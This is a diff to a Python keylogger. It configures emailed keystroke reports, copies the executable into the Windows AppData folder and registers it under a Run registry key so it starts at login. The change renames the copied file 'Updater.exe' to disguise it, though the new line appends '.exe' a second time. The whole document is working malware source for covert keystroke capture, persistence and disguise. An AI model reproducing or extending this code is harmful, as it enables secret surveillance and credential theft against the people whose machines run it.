@@ -30,6 +30,7 @@ SEND_REPORT_EVERY = 10
 EMAIL_ADDRESS = ""
 EMAIL_PASSWORD = r""
 SEND_EMAIL = r""
+EXEC_NAME = "Updater.exe"
 
 class Keylogger:
     def __init__(self, interval):
@@ -77,7 +78,8 @@ class Keylogger:
         keyboard.wait()
 
 def run_at_startup():
-    location = os.environ["appdata"] + "\\SystemProcessCriticalHigh.exe"
+    global EXEC_NAME
+    location = os.environ["appdata"] + f"\\{EXEC_NAME}.exe"
     if not os.path.exists(location):
         shutil.copyfile(sys.executable, location)
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemProcessCriticalHigh /t REG_SZ /d "' + location + '"', shell=True)
